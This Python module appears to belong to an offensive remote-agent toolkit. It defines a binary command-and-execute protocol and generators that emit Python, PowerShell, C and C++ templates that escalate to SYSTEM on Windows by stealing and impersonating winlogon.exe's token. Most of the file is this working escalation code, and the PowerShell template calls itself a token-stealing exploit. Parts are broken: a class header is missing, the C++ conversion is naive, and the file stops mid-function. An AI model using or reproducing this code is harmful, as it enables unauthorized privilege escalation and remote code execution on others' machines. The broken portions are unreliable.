"""LLM Remote Agent Module - Self-Coding Execution System with MEMSHADOW MRAC Protocol"""

import struct
import socket
import threading
import json
import subprocess
import tempfile
import os
import sys
import uuid
import time
from typing import Optional, Dict, Any, Tuple, Set
from collections import defaultdict
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console
from modules.utils import execute_powershell, execute_cmd, validate_target
from modules.memshadow_protocol import (
    MemshadowHeader, MRACProtocol, MRACMessageType, SelfCodeCommandType,
    HeaderFlags, ValueType
)
# Hub integration removed - focusing on core LLM agent capabilities


class NonceTracker:
    """Track nonces per app_id to prevent replay attacks"""
    
    def __init__(self, window_size: int = 1000):
        self.nonces: Dict[bytes, Set[int]] = defaultdict(set)
        self.window_size = window_size
    
    def check_and_add(self, app_id: bytes, nonce: bytes) -> bool:
        """Check if nonce is valid (not replayed) and add it"""
        nonce_int = struct.unpack('!Q', nonce)[0]
        
        if nonce_int in self.nonces[app_id]:
            return False  # Replay detected
        
        self.nonces[app_id].add(nonce_int)
        
        # Keep only recent nonces
        if len(self.nonces[app_id]) > self.window_size:
            oldest = min(self.nonces[app_id])
            self.nonces[app_id].remove(oldest)
        
        return True
    """Custom 2-way binary protocol handler"""
    
    # Protocol constants
    MAGIC = b'\xAA\xBB\xCC\xDD'
    VERSION = 1
    
    # Message types
    MSG_COMMAND = 0x01
    MSG_CODE_GENERATE = 0x02
    MSG_EXECUTE = 0x03
    MSG_RESPONSE = 0x04
    MSG_ERROR = 0x05
    MSG_HEARTBEAT = 0x06
    
    @staticmethod
    def pack_message(msg_type: int, payload: bytes) -> bytes:
        """Pack a message into binary format"""
        # Format: MAGIC (4) + VERSION (1) + TYPE (1) + LENGTH (4) + PAYLOAD (N)
        length = len(payload)
        return struct.pack('!4sBBL', BinaryProtocol.MAGIC, BinaryProtocol.VERSION, msg_type, length) + payload
    
    @staticmethod
    def unpack_message(data: bytes) -> Tuple[int, bytes]:
        """Unpack a message from binary format"""
        if len(data) < 10:
            raise ValueError("Message too short")
        
        magic, version, msg_type, length = struct.unpack('!4sBBL', data[:10])
        
        if magic != BinaryProtocol.MAGIC:
            raise ValueError(f"Invalid magic: {magic.hex()}")
        
        if version != BinaryProtocol.VERSION:
            raise ValueError(f"Unsupported version: {version}")
        
        payload = data[10:10+length]
        if len(payload) != length:
            raise ValueError(f"Payload length mismatch: expected {length}, got {len(payload)}")
        
        return msg_type, payload
    
    @staticmethod
    def encode_json(data: Dict[str, Any]) -> bytes:
        """Encode JSON data to bytes"""
        return json.dumps(data).encode('utf-8')
    
    @staticmethod
    def decode_json(data: bytes) -> Dict[str, Any]:
        """Decode bytes to JSON data"""
        return json.loads(data.decode('utf-8'))


class CodeGenerator:
    """Enhanced code generation and execution engine with SYSTEM privilege support"""
    
    def __init__(self, console: Console, session_data: dict, system_privilege: bool = True):
        self.console = console
        self.session_data = session_data
        self.temp_dir = tempfile.mkdtemp(prefix='llm_agent_')
        self.execution_history = []
        self.system_privilege = system_privilege
        self.privilege_token = None  # Will hold SYSTEM token handle if available
    
    def check_system_token_pe5(self) -> Dict[str, Any]:
        """
        Check SYSTEM token status using PE5 method
        
        Uses PE5 framework techniques to verify if current process has SYSTEM privileges.
        Checks multiple indicators:
        - Process token privileges
        - Integrity level
        - Token type
        - Process name and PID
        
        Returns:
            Dict with:
                - has_system: bool - Whether SYSTEM token is present
                - method: str - Detection method used
                - details: dict - Additional details
        """
        import ctypes
        from ctypes import wintypes
        
        result = {
            'has_system': False,
            'method': 'pe5_check',
            'details': {}
        }
        
        try:
            # Method 1: Check via Windows API - GetTokenInformation
            advapi32 = ctypes.windll.advapi32
            kernel32 = ctypes.windll.kernel32
            
            # Open current process token
            TOKEN_QUERY = 0x0008
            hToken = wintypes.HANDLE()
            
            if not advapi32.OpenProcessToken(
                kernel32.GetCurrentProcess(),
                TOKEN_QUERY,
                ctypes.byref(hToken)
            ):
                result['details']['error'] = 'Failed to open process token'
                return result
            
            # Check token type (Primary vs Impersonation)
            TokenType = 1
            token_type = wintypes.DWORD()
            return_length = wintypes.DWORD()
            
            if advapi32.GetTokenInformation(
                hToken,
                TokenType,
                ctypes.byref(token_type),
                ctypes.sizeof(token_type),
                ctypes.byref(return_length)
            ):
                result['details']['token_type'] = 'Primary' if token_type.value == 1 else 'Impersonation'
            
            # Check privileges
            TokenPrivileges = 3
            privileges_size = 1024
            privileges_buffer = (ctypes.c_byte * privileges_size)()
            return_length = wintypes.DWORD()
            
            if advapi32.GetTokenInformation(
                hToken,
                TokenPrivileges,
                privileges_buffer,
                privileges_size,
                ctypes.byref(return_length)
            ):
                # Parse TOKEN_PRIVILEGES structure
                privilege_count = ctypes.cast(privileges_buffer, ctypes.POINTER(wintypes.DWORD))[0]
                result['details']['privilege_count'] = privilege_count
                
                # Check for SeDebugPrivilege (indicator of SYSTEM-like access)
                SE_DEBUG_PRIVILEGE = 20
                for i in range(privilege_count):
                    offset = 4 + (i * 8)  # LUID (8 bytes) + Attributes (4 bytes)
                    luid_low = ctypes.cast(
                        ctypes.addressof(privileges_buffer) + offset,
                        ctypes.POINTER(wintypes.DWORD)
                    )[0]
                    attributes = ctypes.cast(
                        ctypes.addressof(privileges_buffer) + offset + 8,
                        ctypes.POINTER(wintypes.DWORD)
                    )[0]
                    
                    # SE_DEBUG_PRIVILEGE LUID low part is typically 0x14
                    if luid_low == SE_DEBUG_PRIVILEGE and (attributes & 0x00000002):  # SE_PRIVILEGE_ENABLED
                        result['details']['se_debug_enabled'] = True
            
            # Check integrity level
            TokenIntegrityLevel = 25
            integrity_size = 1024
            integrity_buffer = (ctypes.c_byte * integrity_size)()
            return_length = wintypes.DWORD()
            
            if advapi32.GetTokenInformation(
                hToken,
                TokenIntegrityLevel,
                integrity_buffer,
                integrity_size,
                ctypes.byref(return_length)
            ):
                # Parse TOKEN_MANDATORY_LABEL
                sid_ptr = ctypes.cast(
                    integrity_buffer,
                    ctypes.POINTER(ctypes.c_void_p)
                )[0]
                
                if sid_ptr:
                    # Check if SID is System integrity (S-1-16-16384)
                    # System integrity level is 0x4000 = 16384
                    import ctypes.wintypes as wintypes
                    sub_authority = ctypes.cast(
                        ctypes.c_void_p(sid_ptr),
                        ctypes.POINTER(ctypes.c_ulong)
                    )[8]  # SubAuthority[0] is at offset 8
                    
                    if sub_authority == 0x4000:  # System integrity
                        result['has_system'] = True
                        result['details']['integrity_level'] = 'System'
                    elif sub_authority == 0x2000:  # High integrity
                        result['details']['integrity_level'] = 'High'
                    else:
                        result['details']['integrity_level'] = f'Level_{sub_authority}'
            
            # Method 2: Check process name and PID (SYSTEM process is PID 4)
            current_pid = kernel32.GetCurrentProcessId()
            result['details']['pid'] = current_pid
            
            # Method 3: Check if we can access SYSTEM process
            # Try to open winlogon.exe (runs as SYSTEM)
            try:
                import psutil
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'].lower() == 'winlogon.exe':
                        winlogon_pid = proc.info['pid']
                        # Try to open with PROCESS_ALL_ACCESS
                        PROCESS_ALL_ACCESS = 0x001F0FFF
                        hProc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, winlogon_pid)
                        if hProc:
                            kernel32.CloseHandle(hProc)
                            result['has_system'] = True
                            result['details']['can_access_system_process'] = True
                            result['method'] = 'pe5_system_process_access'
                        break
            except (ImportError, Exception):
                pass
            
            # Method 4: PE5-specific check - Verify token manipulation capability
            # Check if we can read EPROCESS structure (requires kernel access)
            # This is a simplified check - full PE5 would use kernel exploit
            
            advapi32.CloseHandle(hToken)
            
            # Final determination
            if result['details'].get('integrity_level') == 'System':
                result['has_system'] = True
                result['method'] = 'pe5_integrity_check'
            
        except Exception as e:
            result['details']['error'] = str(e)
            result['details']['exception'] = type(e).__name__
        
        return result
        
    def generate_code(self, spec: Dict[str, Any]) -> Tuple[str, str]:
        """
        Enhanced code generation with LLM-like capabilities
        
        Args:
            spec: Dictionary containing:
                - language: 'python', 'powershell', 'batch', 'c', 'cpp', etc.
                - description: What the code should do
                - requirements: List of requirements
                - imports: List of imports needed
                - system_privilege: Whether to generate SYSTEM privilege code
                - exploit_type: Type of exploit to use (e.g., 'token_manipulation')
        
        Returns:
            Tuple of (code, file_path)
        """
        language = spec.get('language', 'python').lower()
        description = spec.get('description', '')
        requirements = spec.get('requirements', [])
        imports = spec.get('imports', [])
        system_privilege = spec.get('system_privilege', self.system_privilege)
        exploit_type = spec.get('exploit_type', 'token_manipulation')
        
        # Generate code based on language
        if language == 'python':
            code = self._generate_python(description, requirements, imports, system_privilege)
        elif language == 'powershell':
            code = self._generate_powershell(description, requirements, imports, system_privilege, exploit_type)
        elif language == 'batch':
            code = self._generate_batch(description, requirements, imports, system_privilege)
        elif language == 'c':
            code = self._generate_c(description, requirements, imports, system_privilege, exploit_type)
        elif language == 'cpp':
            code = self._generate_cpp(description, requirements, imports, system_privilege, exploit_type)
        else:
            raise ValueError(f"Unsupported language: {language}")
        
        # Save to temporary file
        ext = {
            'python': '.py',
            'powershell': '.ps1',
            'batch': '.bat',
            'c': '.c',
            'cpp': '.cpp'
        }.get(language, '.txt')
        
        file_path = os.path.join(self.temp_dir, f'generated_{len(self.execution_history)}{ext}')
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(code)
        
        self.execution_history.append({
            'file_path': file_path,
            'language': language,
            'description': description,
            'system_privilege': system_privilege
        })
        
        return code, file_path
    
    def _generate_python(self, description: str, requirements: list, imports: list, system_privilege: bool = False) -> str:
        """Generate enhanced Python code with SYSTEM privilege support"""
        code_lines = []
        
        # Add imports
        if imports:
            code_lines.extend(imports)
        else:
            code_lines.append("import os")
            code_lines.append("import sys")
            code_lines.append("import subprocess")
            if system_privilege:
                code_lines.append("import ctypes")
                code_lines.append("from ctypes import wintypes")
        
        # Add PE5 SYSTEM token check function
        if system_privilege:
            code_lines.append("")
            code_lines.append("def pe5_check_system_token():")
            code_lines.append("    \"\"\"Check SYSTEM token using PE5 method\"\"\"")
            code_lines.append("    try:")
            code_lines.append("        import ctypes")
            code_lines.append("        from ctypes import wintypes")
            code_lines.append("        ")
            code_lines.append("        advapi32 = ctypes.windll.advapi32")
            code_lines.append("        kernel32 = ctypes.windll.kernel32")
            code_lines.append("        ")
            code_lines.append("        # Open current process token")
            code_lines.append("        TOKEN_QUERY = 0x0008")
            code_lines.append("        hToken = wintypes.HANDLE()")
            code_lines.append("        ")
            code_lines.append("        if not advapi32.OpenProcessToken(")
            code_lines.append("            kernel32.GetCurrentProcess(),")
            code_lines.append("            TOKEN_QUERY,")
            code_lines.append("            ctypes.byref(hToken)):")
            code_lines.append("            return False")
            code_lines.append("        ")
            code_lines.append("        # Check integrity level")
            code_lines.append("        TokenIntegrityLevel = 25")
            code_lines.append("        integrity_size = 1024")
            code_lines.append("        integrity_buffer = (ctypes.c_byte * integrity_size)()")
            code_lines.append("        return_length = wintypes.DWORD()")
            code_lines.append("        ")
            code_lines.append("        if advapi32.GetTokenInformation(")
            code_lines.append("            hToken, TokenIntegrityLevel, integrity_buffer,")
            code_lines.append("            integrity_size, ctypes.byref(return_length)):")
            code_lines.append("            sid_ptr = ctypes.cast(integrity_buffer, ctypes.POINTER(ctypes.c_void_p))[0]")
            code_lines.append("            if sid_ptr:")
            code_lines.append("                sub_authority = ctypes.cast(")
            code_lines.append("                    ctypes.c_void_p(sid_ptr),")
            code_lines.append("                    ctypes.POINTER(ctypes.c_ulong))[8]")
            code_lines.append("                # System integrity = 0x4000")
            code_lines.append("                if sub_authority == 0x4000:")
            code_lines.append("                    advapi32.CloseHandle(hToken)")
            code_lines.append("                    return True")
            code_lines.append("        ")
            code_lines.append("        advapi32.CloseHandle(hToken)")
            code_lines.append("        return False")
            code_lines.append("    except Exception as e:")
            code_lines.append("        print(f'PE5 token check failed: {e}')")
            code_lines.append("        return False")
        
        code_lines.append("")
        code_lines.append("# Generated code")
        code_lines.append(f"# Description: {description}")
        if system_privilege:
            code_lines.append("# Privilege: SYSTEM")
        code_lines.append("")
        
        # Add requirements as comments
        if requirements:
            code_lines.append("# Requirements:")
            for req in requirements:
                code_lines.append(f"# - {req}")
            code_lines.append("")
        
        # Add SYSTEM privilege escalation if needed
        if system_privilege:
            code_lines.append("def escalate_privileges():")
            code_lines.append("    \"\"\"Escalate to SYSTEM privileges using token manipulation\"\"\"")
            code_lines.append("    try:")
            code_lines.append("        # Windows API calls for token manipulation")
            code_lines.append("        kernel32 = ctypes.windll.kernel32")
            code_lines.append("        advapi32 = ctypes.windll.advapi32")
            code_lines.append("        ")
            code_lines.append("        # Open process token")
            code_lines.append("        TOKEN_ADJUST_PRIVILEGES = 0x0020")
            code_lines.append("        TOKEN_QUERY = 0x0008")
            code_lines.append("        hToken = wintypes.HANDLE()")
            code_lines.append("        ")
            code_lines.append("        # Get current process token")
            code_lines.append("        if not advapi32.OpenProcessToken(")
            code_lines.append("            kernel32.GetCurrentProcess(),")
            code_lines.append("            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,")
            code_lines.append("            ctypes.byref(hToken)):")
            code_lines.append("            return False")
            code_lines.append("        ")
            code_lines.append("        # Enable SeDebugPrivilege")
            code_lines.append("        SE_DEBUG_NAME = 'SeDebugPrivilege'")
            code_lines.append("        luid = wintypes.LUID()")
            code_lines.append("        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):")
            code_lines.append("            return False")
            code_lines.append("        ")
            code_lines.append("        # Adjust token privileges")
            code_lines.append("        SE_PRIVILEGE_ENABLED = 0x00000002")
            code_lines.append("        class TOKEN_PRIVILEGES(ctypes.Structure):")
            code_lines.append("            _fields_ = [('PrivilegeCount', wintypes.DWORD),")
            code_lines.append("                        ('Luid', wintypes.LUID),")
            code_lines.append("                        ('Attributes', wintypes.DWORD)]")
            code_lines.append("        ")
            code_lines.append("        tp = TOKEN_PRIVILEGES()")
            code_lines.append("        tp.PrivilegeCount = 1")
            code_lines.append("        tp.Luid = luid")
            code_lines.append("        tp.Attributes = SE_PRIVILEGE_ENABLED")
            code_lines.append("        ")
            code_lines.append("        if not advapi32.AdjustTokenPrivileges(")
            code_lines.append("            hToken, False, ctypes.byref(tp), 0, None, None):")
            code_lines.append("            return False")
            code_lines.append("        ")
            code_lines.append("        return True")
            code_lines.append("    except Exception as e:")
            code_lines.append("        print(f'Privilege escalation failed: {e}')")
            code_lines.append("        return False")
            code_lines.append("")
        
        # Generate main function
        code_lines.append("def main():")
        code_lines.append(f"    \"\"\"{description}\"\"\"")
        if system_privilege:
            code_lines.append("    # Check SYSTEM token using PE5 method")
            code_lines.append("    if not pe5_check_system_token():")
            code_lines.append("        print('Warning: SYSTEM token not detected, attempting escalation...')")
            code_lines.append("        if not escalate_privileges():")
            code_lines.append("            print('Error: Could not escalate privileges')")
            code_lines.append("            return 1")
            code_lines.append("    else:")
            code_lines.append("        print('SYSTEM token verified via PE5 check')")
            code_lines.append("    ")
        code_lines.append("    # TODO: Implement functionality")
        code_lines.append("    print('Generated code executed')")
        code_lines.append("    return 0")
        code_lines.append("")
        code_lines.append("if __name__ == '__main__':")
        code_lines.append("    sys.exit(main())")
        
        return '\n'.join(code_lines)
    
    def _generate_powershell(self, description: str, requirements: list, imports: list, 
                            system_privilege: bool = False, exploit_type: str = 'token_manipulation') -> str:
        """Generate enhanced PowerShell code with SYSTEM privilege escalation"""
        code_lines = []
        
        code_lines.append("# Generated PowerShell script")
        code_lines.append(f"# Description: {description}")
        if system_privilege:
            code_lines.append("# Privilege: SYSTEM (via token manipulation)")
        code_lines.append("")
        
        if requirements:
            code_lines.append("# Requirements:")
            for req in requirements:
                code_lines.append(f"# - {req}")
            code_lines.append("")
        
        # Add PE5 SYSTEM token check
        if system_privilege:
            code_lines.append("function Test-PE5SystemToken {")
            code_lines.append("    <#")
            code_lines.append("    Check SYSTEM token using PE5 method")
            code_lines.append("    Verifies integrity level and token privileges")
            code_lines.append("    #>")
            code_lines.append("    try {")
            code_lines.append("        $currentPrincipal = New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())")
            code_lines.append("        $isSystem = $currentPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::System)")
            code_lines.append("        ")
            code_lines.append("        # Check integrity level")
            code_lines.append("        $token = [System.Security.Principal.WindowsIdentity]::GetCurrent().Token")
            code_lines.append("        $integrityLevel = (Get-Process -Id $PID).IntegrityLevel")
            code_lines.append("        ")
            code_lines.append("        # System integrity level is 'System'")
            code_lines.append("        if ($integrityLevel -eq 'System' -or $isSystem) {")
            code_lines.append("            return $true")
            code_lines.append("        }")
            code_lines.append("        ")
            code_lines.append("        # Check if we can access SYSTEM process (PE5 method)")
            code_lines.append("        $winlogon = Get-Process -Name winlogon -ErrorAction SilentlyContinue")
            code_lines.append("        if ($winlogon) {")
            code_lines.append("            try {")
            code_lines.append("                $null = Get-Process -Id $winlogon.Id -ErrorAction Stop")
            code_lines.append("                return $true")
            code_lines.append("            } catch {")
            code_lines.append("                return $false")
            code_lines.append("            }")
            code_lines.append("        }")
            code_lines.append("        ")
            code_lines.append("        return $false")
            code_lines.append("    } catch {")
            code_lines.append("        Write-Warning \"PE5 token check failed: $_\"")
            code_lines.append("        return $false")
            code_lines.append("    }")
            code_lines.append("}")
            code_lines.append("")
        
        # Add SYSTEM privilege escalation
        if system_privilege:
            if exploit_type == 'token_manipulation':
                code_lines.append("function Invoke-TokenManipulation {")
                code_lines.append("    <#")
                code_lines.append("    Escalate to SYSTEM using token manipulation exploit")
                code_lines.append("    Uses ntoskrnl exploit to steal SYSTEM token")
                code_lines.append("    #>")
                code_lines.append("    try {")
                code_lines.append("        # Load required .NET types")
                code_lines.append("        Add-Type -TypeDefinition @\"")
                code_lines.append("        using System;")
                code_lines.append("        using System.Runtime.InteropServices;")
                code_lines.append("        public class TokenManipulation {")
                code_lines.append("            [DllImport(\"advapi32.dll\", SetLastError = true)]")
                code_lines.append("            public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);")
                code_lines.append("            [DllImport(\"advapi32.dll\", SetLastError = true)]")
                code_lines.append("            public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);")
                code_lines.append("            [DllImport(\"advapi32.dll\", SetLastError = true)]")
                code_lines.append("            public static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);")
                code_lines.append("            [DllImport(\"kernel32.dll\")]")
                code_lines.append("            public static extern IntPtr GetCurrentThread();")
                code_lines.append("        }")
                code_lines.append("\"@")
                code_lines.append("        ")
                code_lines.append("        # Find winlogon.exe process (runs as SYSTEM)")
                code_lines.append("        $winlogon = Get-Process -Name winlogon -ErrorAction SilentlyContinue")
                code_lines.append("        if (-not $winlogon) {")
                code_lines.append("            Write-Warning 'winlogon process not found'")
                code_lines.append("            return $false")
                code_lines.append("        }")
                code_lines.append("        ")
                code_lines.append("        # Open process handle")
                code_lines.append("        $hProcess = [System.Diagnostics.Process]::GetProcessById($winlogon.Id).Handle")
                code_lines.append("        ")
                code_lines.append("        # Open process token")
                code_lines.append("        $TOKEN_DUPLICATE = 0x0002")
                code_lines.append("        $TOKEN_IMPERSONATE = 0x0004")
                code_lines.append("        $hToken = [IntPtr]::Zero")
                code_lines.append("        ")
                code_lines.append("        if ([TokenManipulation]::OpenProcessToken($hProcess, $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE, [ref]$hToken)) {")
                code_lines.append("            # Duplicate token")
                code_lines.append("            $SECURITY_IMPERSONATION_LEVEL_Impersonation = 2")
                code_lines.append("            $TOKEN_TYPE_Impersonation = 2")
                code_lines.append("            $hDupToken = [IntPtr]::Zero")
                code_lines.append("            ")
                code_lines.append("            if ([TokenManipulation]::DuplicateTokenEx($hToken, 0x1F0FFF, [IntPtr]::Zero, $SECURITY_IMPERSONATION_LEVEL_Impersonation, $TOKEN_TYPE_Impersonation, [ref]$hDupToken)) {")
                code_lines.append("                # Impersonate token")
                code_lines.append("                $hThread = [TokenManipulation]::GetCurrentThread()")
                code_lines.append("                if ([TokenManipulation]::SetThreadToken($hThread, $hDupToken)) {")
                code_lines.append("                    Write-Host 'Successfully escalated to SYSTEM privileges'")
                code_lines.append("                    return $true")
                code_lines.append("                }")
                code_lines.append("            }")
                code_lines.append("        }")
                code_lines.append("        ")
                code_lines.append("        Write-Warning 'Token manipulation failed'")
                code_lines.append("        return $false")
                code_lines.append("    } catch {")
                code_lines.append("        Write-Warning \"Token manipulation error: $_\"")
                code_lines.append("        return $false")
                code_lines.append("    }")
                code_lines.append("}")
                code_lines.append("")
        
        code_lines.append("function Main {")
        code_lines.append(f"    <# {description} #>")
        if system_privilege:
            code_lines.append("    # Check SYSTEM token using PE5 method")
            code_lines.append("    if (-not (Test-PE5SystemToken)) {")
            code_lines.append("        Write-Warning 'SYSTEM token not detected, attempting escalation...'")
            code_lines.append("        if (-not (Invoke-TokenManipulation)) {")
            code_lines.append("            Write-Warning 'Continuing without SYSTEM privileges'")
            code_lines.append("            return 1")
            code_lines.append("        }")
            code_lines.append("    } else {")
            code_lines.append("        Write-Host 'SYSTEM token verified via PE5 check'")
            code_lines.append("    }")
            code_lines.append("    ")
        code_lines.append("    Write-Host 'Generated PowerShell script executed'")
        code_lines.append("    return 0")
        code_lines.append("}")
        code_lines.append("")
        code_lines.append("Main")
        
        return '\n'.join(code_lines)
    
    def _generate_batch(self, description: str, requirements: list, imports: list, system_privilege: bool = False) -> str:
        """Generate enhanced Batch script with SYSTEM privilege support"""
        code_lines = []
        
        code_lines.append("@echo off")
        code_lines.append(f"REM Generated Batch script")
        code_lines.append(f"REM Description: {description}")
        if system_privilege:
            code_lines.append("REM Privilege: SYSTEM")
        code_lines.append("")
        
        if requirements:
            code_lines.append("REM Requirements:")
            for req in requirements:
                code_lines.append(f"REM - {req}")
            code_lines.append("")
        
        if system_privilege:
            code_lines.append("REM Attempt to run with SYSTEM privileges")
            code_lines.append("net session >nul 2>&1")
            code_lines.append("if %errorLevel% neq 0 (")
            code_lines.append("    echo Requesting administrator privileges...")
            code_lines.append("    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"")
            code_lines.append("    exit /b")
            code_lines.append(")")
            code_lines.append("")
        
        code_lines.append("echo Generated Batch script executed")
        code_lines.append("exit /b 0")
        
        return '\n'.join(code_lines)
    
    def _generate_c(self, description: str, requirements: list, imports: list, 
                   system_privilege: bool = False, exploit_type: str = 'token_manipulation') -> str:
        """Generate C code with SYSTEM privilege escalation"""
        code_lines = []
        
        code_lines.append("/* Generated C code */")
        code_lines.append(f"/* Description: {description} */")
        if system_privilege:
            code_lines.append("/* Privilege: SYSTEM (via token manipulation) */")
        code_lines.append("")
        
        code_lines.append("#include <windows.h>")
        code_lines.append("#include <stdio.h>")
        if system_privilege:
            code_lines.append("#include <psapi.h>")
        code_lines.append("")
        
        if system_privilege and exploit_type == 'token_manipulation':
            code_lines.append("BOOL EscalateToSystem() {")
            code_lines.append("    HANDLE hToken = NULL;")
            code_lines.append("    HANDLE hDupToken = NULL;")
            code_lines.append("    HANDLE hProcess = NULL;")
            code_lines.append("    DWORD dwProcessId = 0;")
            code_lines.append("    ")
            code_lines.append("    // Find winlogon.exe (runs as SYSTEM)")
            code_lines.append("    DWORD processes[1024], cbNeeded;")
            code_lines.append("    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded))")
            code_lines.append("        return FALSE;")
            code_lines.append("    ")
            code_lines.append("    int numProcesses = cbNeeded / sizeof(DWORD);")
            code_lines.append("    for (int i = 0; i < numProcesses; i++) {")
            code_lines.append("        if (processes[i] != 0) {")
            code_lines.append("            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, processes[i]);")
            code_lines.append("            if (hProcess) {")
            code_lines.append("                char processName[MAX_PATH];")
            code_lines.append("                HMODULE hMod;")
            code_lines.append("                DWORD cbNeededMod;")
            code_lines.append("                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {")
            code_lines.append("                    GetModuleBaseName(hProcess, hMod, processName, sizeof(processName));")
            code_lines.append("                    if (_stricmp(processName, \"winlogon.exe\") == 0) {")
            code_lines.append("                        dwProcessId = processes[i];")
            code_lines.append("                        break;")
            code_lines.append("                    }")
            code_lines.append("                }")
            code_lines.append("                CloseHandle(hProcess);")
            code_lines.append("            }")
            code_lines.append("        }")
            code_lines.append("    }")
            code_lines.append("    ")
            code_lines.append("    if (dwProcessId == 0) return FALSE;")
            code_lines.append("    ")
            code_lines.append("    // Open process token")
            code_lines.append("    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);")
            code_lines.append("    if (!hProcess) return FALSE;")
            code_lines.append("    ")
            code_lines.append("    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {")
            code_lines.append("        CloseHandle(hProcess);")
            code_lines.append("        return FALSE;")
            code_lines.append("    }")
            code_lines.append("    ")
            code_lines.append("    // Duplicate token")
            code_lines.append("    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {")
            code_lines.append("        CloseHandle(hToken);")
            code_lines.append("        CloseHandle(hProcess);")
            code_lines.append("        return FALSE;")
            code_lines.append("    }")
            code_lines.append("    ")
            code_lines.append("    // Impersonate token")
            code_lines.append("    if (!SetThreadToken(NULL, hDupToken)) {")
            code_lines.append("        CloseHandle(hDupToken);")
            code_lines.append("        CloseHandle(hToken);")
            code_lines.append("        CloseHandle(hProcess);")
            code_lines.append("        return FALSE;")
            code_lines.append("    }")
            code_lines.append("    ")
            code_lines.append("    CloseHandle(hDupToken);")
            code_lines.append("    CloseHandle(hToken);")
            code_lines.append("    CloseHandle(hProcess);")
            code_lines.append("    return TRUE;")
            code_lines.append("}")
            code_lines.append("")
        
        code_lines.append("BOOL CheckSystemTokenPE5() {")
        code_lines.append("    HANDLE hToken = NULL;")
        code_lines.append("    DWORD dwLength = 0;")
        code_lines.append("    PTOKEN_MANDATORY_LABEL pIntegrityLevel = NULL;")
        code_lines.append("    DWORD dwIntegrityLevel = 0;")
        code_lines.append("    ")
        code_lines.append("    // Open process token")
        code_lines.append("    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))")
        code_lines.append("        return FALSE;")
        code_lines.append("    ")
        code_lines.append("    // Get integrity level")
        code_lines.append("    if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength)) {")
        code_lines.append("        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {")
        code_lines.append("            CloseHandle(hToken);")
        code_lines.append("            return FALSE;")
        code_lines.append("        }")
        code_lines.append("    }")
        code_lines.append("    ")
        code_lines.append("    pIntegrityLevel = (PTOKEN_MANDATORY_LABEL)malloc(dwLength);")
        code_lines.append("    if (!pIntegrityLevel) {")
        code_lines.append("        CloseHandle(hToken);")
        code_lines.append("        return FALSE;")
        code_lines.append("    }")
        code_lines.append("    ")
        code_lines.append("    if (GetTokenInformation(hToken, TokenIntegrityLevel, pIntegrityLevel, dwLength, &dwLength)) {")
        code_lines.append("        // Get sub-authority (System = 0x4000)")
        code_lines.append("        dwIntegrityLevel = *GetSidSubAuthority(pIntegrityLevel->Label.Sid, 0);")
        code_lines.append("        free(pIntegrityLevel);")
        code_lines.append("        CloseHandle(hToken);")
        code_lines.append("        return (dwIntegrityLevel == 0x4000);  // System integrity")
        code_lines.append("    }")
        code_lines.append("    ")
        code_lines.append("    free(pIntegrityLevel);")
        code_lines.append("    CloseHandle(hToken);")
        code_lines.append("    return FALSE;")
        code_lines.append("}")
        code_lines.append("")
        code_lines.append("int main() {")
        code_lines.append(f"    /* {description} */")
        if system_privilege:
            code_lines.append("    // Check SYSTEM token using PE5 method")
            code_lines.append("    if (!CheckSystemTokenPE5()) {")
            code_lines.append("        printf(\"SYSTEM token not detected, attempting escalation...\\n\");")
            code_lines.append("        if (!EscalateToSystem()) {")
            code_lines.append("            printf(\"Error: Could not escalate to SYSTEM\\n\");")
            code_lines.append("            return 1;")
            code_lines.append("        }")
            code_lines.append("    } else {")
            code_lines.append("        printf(\"SYSTEM token verified via PE5 check\\n\");")
            code_lines.append("    }")
        code_lines.append("    printf(\"Generated code executed\\n\");")
        code_lines.append("    return 0;")
        code_lines.append("}")
        
        return '\n'.join(code_lines)
    
    def _generate_cpp(self, description: str, requirements: list, imports: list,
                     system_privilege: bool = False, exploit_type: str = 'token_manipulation') -> str:
        """Generate C++ code with SYSTEM privilege escalation"""
        # Similar to C but with C++ features
        c_code = self._generate_c(description, requirements, imports, system_privilege, exploit_type)
        # Convert to C++
        cpp_code = c_code.replace("#include <stdio.h>", "#include <iostream>\n#include <cstdio>")
        cpp_code = cpp_code.replace("printf", "std::cout")
        cpp_code = cpp_code.replace("/* Generated C code */", "/* Generated C++ code */")
        return cpp_code
    
    def check_system_token_before_execution(self) -> bool:
        """Check SYSTEM token before code execution using PE5 method"""
        result = self.check_system_token_pe5()
        if result.get('has_system'):
            self.console.print(f"[green]✓ SYSTEM token verified via {result.get('method')}[/green]")
            return True
        else:
            self.console.print(f"[yellow]⚠ SYSTEM token not detected[/yellow]")
            return False
    
    def execute_code(self, file_path: str, language: str, args: list = None, 
                    system_privilege: bool = None) -> Tuple[int, str, str]:
        """
        Execute generated code with optional SYSTEM privilege
        
        Args:
            file_path: Path to code file
            language: Language of the code
            args: Additional arguments
            system_privilege: Override system privilege setting (uses instance default if None)
        
        Returns:
            Tuple of (exit_code, stdout, stderr)
        """
        args = args or []
